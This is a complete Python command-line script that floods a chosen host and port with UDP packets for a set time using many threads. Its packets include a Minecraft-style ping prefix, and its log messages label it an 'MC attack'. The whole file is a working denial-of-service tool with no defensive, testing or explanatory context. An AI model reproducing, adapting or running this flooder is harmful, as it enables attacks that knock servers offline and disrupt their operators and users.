#!/usr/bin/env python3
import socket, random, time, threading, sys

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 1000

def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                packet = b'\x00\x00\x00\x00' + random._urandom(64)
                s.sendto(packet, (target, port))
                packet2 = b'\xFE\x01' + random._urandom(32)
                s.sendto(packet2, (target, port))
                packet3 = random._urandom(2048)
                s.sendto(packet3, (target, port))
                count += 3
                if count % 1000 == 0:
                    sys.stderr.write(f"MC: {count} packets\n")
            except:
                pass
        s.close()
        sys.stderr.write(f"MC attack completed: {count} packets\n")
    except:
        pass

for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
